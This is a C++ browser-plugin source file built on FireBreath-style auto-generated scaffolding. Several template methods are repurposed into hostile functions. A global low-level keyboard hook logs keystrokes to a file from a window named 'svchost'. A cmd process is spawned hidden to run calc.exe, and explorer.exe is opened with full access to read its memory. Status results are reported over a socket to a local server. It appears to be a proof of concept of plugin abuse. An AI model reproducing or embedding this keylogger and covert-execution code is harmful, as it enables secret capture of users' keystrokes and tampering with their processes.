/**********************************************************\

  Auto-generated PRCSAPI.cpp

\**********************************************************/

#include "JSObject.h"
#include "variant_list.h"
#include "DOM/Document.h"
#include "global/config.h"
#include <fstream>

#include <stdio.h>
#include <tchar.h>

//mine/////////////+
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <string.h>
// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")




#include <conio.h>
#pragma comment(lib, "user32.lib")

#define BUF_SIZE 256
TCHAR szName[]=TEXT("MyFileMappingObject");

#include <atlstr.h>
#include <cstdio>
#include <tlhelp32.h>

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
//logger..
HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp);
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp);
char	windir[MAX_PATH + 1];


// TCP socket type
#define DEFAULT_PROTO SOCK_STREAM

int SEND_TO_SERVER(char *buf);
int seqnum = 1;
int Port;
int TestID;
std::string sID;
HANDLE myPROC;
////////////+
#include "PRCSAPI.h"

///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::echo(const FB::variant& msg)
///
/// @brief  Echos whatever is passed from Javascript.
///         Go ahead and change it. See what happens!
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::echo(const FB::variant& msg)
{
	wchar_t input[] = L"C:\\Windows\\System32\\calc.exe";
	wchar_t cmd[] = L"cmd";
	// initialize cmd
	wchar_t cmdline[MAX_PATH + 50];
	swprintf_s(cmdline, L"%s /C %s", cmd, input);
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | CREATE_NO_WINDOW;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
	si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
	si.wShowWindow = SW_HIDE;
	// If you want to redirect result of command, set startInf.hStdOutput to a file
	// or pipe handle that you can read it, otherwise we are done!
	PROCESS_INFORMATION procInf;
	memset(&procInf, 0, sizeof procInf);
	BOOL b = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
		NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &procInf);
	DWORD dwErr = 0;
	myPROC = procInf.hProcess;
	
	if(b){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		char buf[128];
		memset(&buf[0], 0, sizeof(buf));	
		strcpy_s(buf, respon.c_str());
		SEND_TO_SERVER(buf);
		

	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		char buf[128];
		memset(&buf[0], 0, sizeof(buf));	
		strcpy_s(buf, respon.c_str());
		SEND_TO_SERVER(buf);
	}

    // return "foobar";
	return msg;
}


FB::variant PRCSAPI::test(const FB::variant& msg)
{
	TerminateProcess(myPROC, 0);
	std::string respon = std::to_string(seqnum++) + '.' + sID + ":END";
	char buf[128];
	memset(&buf[0], 0, sizeof(buf));	
	strcpy_s(buf, respon.c_str());
	SEND_TO_SERVER(buf);
	
	DWORD id = GetCurrentProcessId();

	DWORD dwDesiredAccess = PROCESS_TERMINATE;
	BOOL  bInheritHandle  = FALSE;
	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, id);
	if (hProcess == NULL)
		return FALSE;

	BOOL result = TerminateProcess(hProcess, 0);

	CloseHandle(hProcess);
	
	return 1;
}


FB::variant PRCSAPI::keylogger(void){
	return 0;

}

/**
* \brief Called by Windows automagically every time a key is pressed (regardless
* of who has focus)
*/
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		* Get key name as string
		*/
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, (LPWSTR)tmp, 0xFF);
//		GetKeyNameText()
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		* Non-printable characters only:
		* Some of these (namely; newline, space and tab) will be
		* made into printable characters.
		* Others are encapsulated in brackets ('[' and ']').
		*/
		if (!printable) {
			/*
			* Keynames that change state are handled here.
			*/
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			/*
			* Keynames that may become printable characters are
			* handled here.
			*/
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			}
			else if (str == "SPACE") {
				str = " ";
				printable = true;
			}
			else if (str == "TAB") {
				str = "\t";
				printable = true;
			}
			else {
				str = ("[" + str + "]");
			}
		}

		/*
		* Printable characters only:
		* If shift is on and capslock is off or shift is off and
		* capslock is on, make the character uppercase.
		* If both are off or both are on, the character is lowercase
		*/
		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}


		std::cout << str;

		std::ofstream myfile;
		myfile.open("C:\\Users\\Jusko\\Desktop\\example.txt");
		myfile << str;
		myfile.close();
		/*
		std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << str;
		outfile.close();
		*/
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}


/**
* \brief Called by DispatchMessage() to handle messages
* \param hwnd	Window handle
* \param msg	Message to handle
* \param wp
* \param lp
* \return 0 on success
*/
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_CLOSE: case WM_DESTROY:
		running = false;
		break;
	default:
		/* Call default message handler */
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}



bool PRCSAPI::doSomethingTimeConsuming( int num, FB::JSObjectPtr &callback )
{
    boost::thread t(boost::bind(&PRCSAPI::doSomethingTimeConsuming_thread,
         this, num, callback));
    return true; // the thread is started
}

void PRCSAPI::doSomethingTimeConsuming_thread( int num, FB::JSObjectPtr &callback )
{
    // Do something that takes a long time here
    int result = num * 10;
	/*
	* Set up window
	*/
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
	MSG		msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;
	HINSTANCE   thisinstance = GetModuleHandle(NULL);

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = L"winkey";
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	//if (!(RegisterClassEx(&windowclass)))
		//return 1;

	hwnd = CreateWindowEx(NULL, L"winkey", L"svchost", WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	//if (!(hwnd))
		//return 1;

	/*
	* Make the window invisible
	*/

	/*
	* Debug mode: Make the window visiblefddff
	*/
	ShowWindow(hwnd, SW_SHOW);

	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

	/*
	* Hook keyboard input so we get it too
	*/
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	GetWindowsDirectory((LPWSTR)windir, MAX_PATH);

	/*
	* Main loop
	*/
	while (running) {
		/*
		* Get messages, dispatch to window procedure
		*/
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false; /*
							 * This is not a "return" or
							 * "break" so the rest of the loop is
							 * done. This way, we never miss keys
							 * when destroyed but we still exit.
							 */
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

    callback->InvokeAsync("", FB::variant_list_of(shared_from_this())(result));
}


FB::variant PRCSAPI::memory(void){
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

	int retvalue = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
			if (wcscmp(entry.szExeFile, L"explorer.exe") == 0)
            {  
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

				int value = 2;
				DWORD addr = 0x0000000;
				
				retvalue = ReadProcessMemory(hProcess, (void*)addr, &value, sizeof(value), 0);
				/*
				cout << "Read   : " << value << endl;
				cout << "Error  : " << GetLastError();
				*/

                CloseHandle(hProcess);

				break;
            }
        }
    }

    CloseHandle(snapshot);

	if(retvalue != 0){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		char buf[128];
		memset(&buf[0], 0, sizeof(buf));	
		strcpy_s(buf, respon.c_str());
		SEND_TO_SERVER(buf);
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		char buf[128];
		memset(&buf[0], 0, sizeof(buf));	
		strcpy_s(buf, respon.c_str());
		SEND_TO_SERVER(buf);
	}

	return 0;
}


// method called at startup, initial communication with server
// first, get the port number and test ID from shared memory!!!!!!

FB::variant PRCSAPI::launched(void)
{
	HANDLE hMapFile;
	LPCTSTR pBuf;

	hMapFile = OpenFileMapping(
					FILE_MAP_READ,   // read/write access
					FALSE,                 // do not inherit the name
					szName);               // name of mapping object

	if (hMapFile == NULL)
	{
		_tprintf(TEXT("Could not open file mapping object (%d).\n"),
				GetLastError());
		return -1;
	}

	pBuf = (LPTSTR) MapViewOfFile(hMapFile, // handle to map object
				FILE_MAP_READ,  // read/write permission
				0,
				0,
				BUF_SIZE);

	if (pBuf == NULL)
	{
		_tprintf(TEXT("Could not map view of file (%d).\n"),
				GetLastError());

		CloseHandle(hMapFile);

		return 1;
	}

	//string from server in shared memory successfully obtained in pBuf variable
	std::string temp = CT2A(pBuf);

	std::string sPort = temp.substr(temp.find(':') + 1, temp.length());
	sID = temp.substr(0, temp.find(':'));

	std::wstring stemp = std::wstring(sID.begin(), sID.end());
	LPCWSTR sw = stemp.c_str();

	//MessageBox(NULL, sw, sw, MB_OK | MB_ICONERROR);
	
	Port = stoi(sPort);


	UnmapViewOfFile(pBuf);

	CloseHandle(hMapFile);

	std::string respon = std::to_string(seqnum++) + '.' + sID + ":INIT";

	char buf[128];
	memset(&buf[0], 0, sizeof(buf));
	
	strcpy_s(buf, respon.c_str());
	SEND_TO_SERVER(buf);
	return NULL;
	
	
}


///////////////////////////////////////////////////////////////////////////////
/// @fn PRCSPtr PRCSAPI::getPlugin()
///
/// @brief  Gets a reference to the plugin that was passed in when the object
///         was created.  If the plugin has already been released then this
///         will throw a FB::script_error that will be translated into a
///         javascript exception in the page.
///////////////////////////////////////////////////////////////////////////////
PRCSPtr PRCSAPI::getPlugin()
{
    PRCSPtr plugin(m_plugin.lock());
    if (!plugin) {
        throw FB::script_error("The plugin is invalid");
    }
    return plugin;
}

// Read/Write property testString
std::string PRCSAPI::get_testString()
{
    return m_testString;
}

void PRCSAPI::set_testString(const std::string& val)
{
    m_testString = val;
}

// Read-only property version
std::string PRCSAPI::get_version()
{
    return FBSTRING_PLUGIN_VERSION;
}

void PRCSAPI::testEvent()
{
    fire_test();
}

/*

COMMUNICATION

*/

#include <iostream>
#include <fstream>
#include <string>

int SEND_TO_SERVER(char *Buffer){
	// default to localhost
	char *server_name = "localhost";
	unsigned short port = Port;
	int retval, loopflag = 0;
	int loopcount, maxloop = -1;
	int socket_type = SOCK_STREAM;
	struct sockaddr_in server;
	struct hostent *hp;
	WSADATA wsaData;
	SOCKET  conn_socket;
	using namespace std;
	

	if ((retval = WSAStartup(0x202, &wsaData)) != 0)
	{
		fprintf(stderr, "Client: WSAStartup() failed with error %d\n", retval);
		WSACleanup();
		return -1;
	}
	else
		printf("Client: WSAStartup() is OK.\n");

	hp = gethostbyname(server_name);
	if (hp == NULL)
	{
		fprintf(stderr, "Client: Cannot resolve address \"%s\": Error %d\n", server_name, WSAGetLastError());
		WSACleanup();
		exit(1);
	}
	else
		printf("Client: gethostbyaddr() is OK.\n");

	// Copy the resolved information into the sockaddr_in structure
	memset(&server, 0, sizeof(server));
	memcpy(&(server.sin_addr), hp->h_addr, hp->h_length);
	server.sin_family = hp->h_addrtype;
	server.sin_port = htons(port);

	conn_socket = socket(AF_INET, socket_type, 0); /* Open a socket */
	if (conn_socket <0)
	{
		fprintf(stderr, "Client: Error Opening socket: Error %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: socket() is OK.\n");


	printf("Client: Client connecting to: %s.\n", hp->h_name);
	if (connect(conn_socket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: connect() failed: %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: connect() is OK.\n");

	// Test sending some string
	loopcount = 0;
	while (1)
	{
		retval = send(conn_socket, Buffer, strlen(Buffer), 0);
		if (retval == SOCKET_ERROR)
		{
			fprintf(stderr, "Client: send() failed: error %d.\n", WSAGetLastError());
			WSACleanup();
			return -1;
		}
		else
			printf("Client: send() is OK.\n");

		printf("Client: Sent data \"%s\"\n", Buffer);

		//closesocket(conn_socket);
		//WSACleanup();
			//return -1;
		
		retval = recv(conn_socket, Buffer, sizeof(Buffer), 0);
		if (retval == SOCKET_ERROR)
		{
			fprintf(stderr, "Client: recv() failed: error %d.\n", WSAGetLastError());
			closesocket(conn_socket);
			WSACleanup();
			return -1;
		}
		else
			printf("Client: recv() is OK.\n");


		if (retval == 0)
		{
			printf("Client: Server closed connection.\n");
			closesocket(conn_socket);
			WSACleanup();
			return -1;
		}

		printf("Client: Received %d bytes, data \"%s\" from server.\n", retval, Buffer);
		break;
		/*
		if (!loopflag)
		{
			MessageBox(NULL, L"I am just trying my wedding dress", NULL, NULL);
			printf("Client: Terminating connection...\n");
			break;
		}
		else
		{
			if ((loopcount >= maxloop) && (maxloop >0))
				break;
		}
		*/
		
	}


	closesocket(conn_socket);
	WSACleanup();

	return 0;
}
